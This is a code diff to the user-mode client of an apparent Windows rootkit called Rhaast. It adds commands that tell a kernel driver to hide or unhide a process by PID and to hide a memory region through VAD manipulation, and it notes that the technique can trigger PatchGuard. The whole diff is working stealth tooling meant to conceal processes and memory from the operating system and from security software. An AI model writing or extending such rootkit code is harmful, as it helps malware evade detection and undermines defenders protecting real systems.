@@ -174,9 +174,19 @@ BOOL Rhaast::DispatchInput(
         /* convert pid string to int */
         Pid = std::stoi( args[ 1 ].c_str() );
 
+        /* first check if process exists */
+        if ( ! ProcessCheckById( Pid ) ) {
+            spdlog::error( "specified process id does not exists" );
+            FAIL_END
+        }
+
         /* TODO: check if process exists */
         if ( ProcessQueryNameById( Pid, &Name ) )
         {
+            /* warn about patch guard detection */
+            spdlog::warn( "the technique is known to trigger PatchGuard" );
+
+            /* print basic process info */
             spdlog::info( "process to hide:" );
             spdlog::info( "   - process id   : {}", Pid );
             spdlog::info( "   - process name : {}", std::string( ( PCHAR ) Name.Buffer ) );
@@ -185,7 +195,7 @@ BOOL Rhaast::DispatchInput(
             if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_HIDE, &Pid, sizeof( ULONG ) ) ) ) ) {
                 spdlog::info( "process successfully hidden" );
             } else {
-                spdlog::info( "failed while hiding process" );
+                spdlog::error( "failed while hiding process" );
             }
 
             /* free process name memory */
@@ -197,6 +207,71 @@ BOOL Rhaast::DispatchInput(
         }
 
     } else if ( args[ 0 ] == "process::unhide" ) {
+
+        ULONG Pid = 0;
+
+        /* check if enough args has been specified */
+        ARGS_CHECK_LEN( 1 )
+
+        /* check if arg is a number */
+        if ( ! StringIsNumber( args[ 1 ] ) ) {
+            spdlog::error( "specified argument is not a number" );
+            FAIL_END
+        }
+
+        /* convert pid string to int */
+        Pid = std::stoi( args[ 1 ].c_str() );
+
+        spdlog::info( "unhide process: {}", Pid );
+
+        /* send command */
+        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_UNHIDE, &Pid, sizeof( ULONG ) ) ) ) ) {
+            spdlog::info( "process successfully unhidden" );
+        } else {
+            spdlog::error( "failed to unhide process" );
+        }
+
+    } else if ( args[ 0 ] == "memory::hide" ) {
+
+        RS_C_MEMORY_VAD MemoryVad = { 0 };
+
+        /* check if enough args has been specified */
+        ARGS_CHECK_LEN( 2 )
+
+        /* check if arg is a number */
+        if ( ! StringIsNumber( args[ 1 ] ) ) {
+            spdlog::error( "specified argument is not a number" );
+            FAIL_END
+        }
+
+        /* check if arg is a hex string (address) */
+        if ( ! StringIsHex( args[ 2 ] ) ) {
+            spdlog::error( "specified argument is not a number" );
+            FAIL_END
+        }
+
+        MemoryVad.Pid     = std::stoul( args[ 1 ] );
+        MemoryVad.Address = std::stoull( args[ 2 ], nullptr, 16 );
+        MemoryVad.Hide    = TRUE;
+
+        /* first check if process exists */
+        if ( ! ProcessCheckById( MemoryVad.Pid ) ) {
+            spdlog::error( "specified process id does not exists" );
+            FAIL_END
+        }
+
+        spdlog::info( "memory hide:" );
+        spdlog::info( " - Process Id     : {}", args[ 1 ] );
+        spdlog::info( " - Virtual Address: {}", args[ 2 ] );
+
+        /* send command */
+        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_MEMORY_VAD, &MemoryVad, sizeof( MemoryVad ) ) ) ) ) {
+            spdlog::info( "memory successfully hidden" );
+        } else {
+            spdlog::error( "failed to hide memory" );
+        }
+
+    } else if ( args[ 0 ] == "memory::unhide" ) {
 
     } else {
 
